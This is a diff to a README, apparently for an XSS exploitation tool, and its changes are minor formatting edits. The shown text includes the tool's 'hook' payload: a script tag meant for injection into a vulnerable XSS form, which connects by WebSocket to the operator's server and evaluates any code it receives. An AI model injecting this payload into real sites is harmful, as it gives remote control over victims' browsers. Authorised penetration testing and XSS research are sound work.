@@ -25,9 +25,7 @@ for this because the application will take care of tunneling the connection betw
 **Hook** is an HTML code snippet designed to be embedded in a vulnerable XSS form. It looks like:
 
 ```html
-
-<script>c = new WebSocket('{{environment.public_url}}');
-c.onmessage = (e) => eval(e.data);</script>
+<script>c = new WebSocket('{{environment.public_url}}');c.onmessage = (e) => eval(e.data);</script>
 ```
 
 **NOTE:** _As you can see here is a built-in variable: {{environment.public_url}}. You can read more about
@@ -89,7 +87,7 @@ templating engine. It contains additional information that may be needed when lo
 
 #### Environment
 
-- public_url - public address of WebSocket server
+- **public_url** - public address of WebSocket server
 
 #### Metadata
 
@@ -169,6 +167,7 @@ And finally you can run it:
 ```commandline
 python main.py
 ```
+
 
 ## License
 
